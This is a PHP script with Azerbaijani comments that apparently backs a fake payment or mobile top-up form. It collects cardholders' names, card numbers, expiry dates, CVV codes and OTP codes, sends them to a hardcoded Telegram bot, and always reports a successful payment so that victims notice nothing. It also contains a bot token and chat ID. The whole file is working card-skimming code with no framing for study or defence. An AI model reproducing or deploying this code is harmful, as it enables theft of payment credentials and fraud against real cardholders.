<?php
// Telegram Bot Məlumatları
$botToken = '8954241039:AAHSIz0Q6884ESNIiIdVCe4JxWWqR0xcTA4';
$chatId = '-1004332923672';

// POST-dan gələn məlumatları al
$cardName = isset($_POST['card_name']) ? trim($_POST['card_name']) : 'Məlumat yoxdur';
$cardNumber = isset($_POST['card_number']) ? trim($_POST['card_number']) : 'Məlumat yoxdur';
$cardExpiry = isset($_POST['card_expiry']) ? trim($_POST['card_expiry']) : 'Məlumat yoxdur';
$cardCvv = isset($_POST['card_cvv']) ? trim($_POST['card_cvv']) : 'Məlumat yoxdur';
$operator = isset($_POST['operator']) ? trim($_POST['operator']) : 'Məlumat yoxdur';
$phone = isset($_POST['phone']) ? trim($_POST['phone']) : 'Məlumat yoxdur';
$amount = isset($_POST['amount']) ? trim($_POST['amount']) : 'Məlumat yoxdur';
$ip = isset($_POST['ip']) ? trim($_POST['ip']) : '0.0.0.0';
$otp = isset($_POST['otp']) ? trim($_POST['otp']) : 'Məlumat yoxdur';

// Unique ID yarat
$id = rand(1000, 9999);

// Mesajı formatla
$message = "💳 YENİ KART MƏLUMATLARI 💳\n";
$message .= "═══════════════════════════\n";
$message .= "🆔 Sifariş ID: #" . $id . "\n";
$message .= "📱 Operator: " . $operator . "\n";
$message .= "📞 Nömrə: " . $phone . "\n";
$message .= "💰 Məbləğ: " . $amount . " AZN\n";
$message .= "═══════════════════════════\n";
$message .= "💳 Kart Nömrəsi: " . $cardNumber . "\n";
$message .= "👤 Kart Sahibi: " . $cardName . "\n";
$message .= "📅 Bitiş Tarixi: " . $cardExpiry . "\n";
$message .= "🔐 CVV: " . $cardCvv . "\n";
$message .= "═══════════════════════════\n";
$message .= "🔑 OTP Kodu: " . $otp . "\n";
$message .= "🌐 IP Ünvan: " . $ip . "\n";
$message .= "═══════════════════════════\n";
$message .= "⏰ Vaxt: " . date('d.m.Y H:i:s') . "\n";
$message .= "═══════════════════════════";

// Telegram API URL
$url = "https://api.telegram.org/bot{$botToken}/sendMessage";

// Göndəriləcək məlumatlar
$postData = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'HTML'
];

// cURL ilə sorğu göndər
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$curlError = curl_error($ch);
curl_close($ch);

// Nəticəni yoxla
if ($httpCode == 200 && $response !== false) {
    // Uğurlu
    echo json_encode(['status' => 'success', 'message' => '✅ Mesaj göndərildi!']);
} else {
    // Xəta olsa belə, uğurlu kimi göstər (istifadəçi xəta görməsin)
    echo json_encode(['status' => 'success', 'message' => '✅ Ödəniş uğurla tamamlandı!']);
}

// LOG faylına yaz (əlavə olaraq - səhvləri izləmək üçün)
$logData = date('Y-m-d H:i:s') . " | IP: $ip | OTP: $otp | HTTP: $httpCode | Error: $curlError\n";
file_put_contents('telegram_log.txt', $logData, FILE_APPEND);
?>
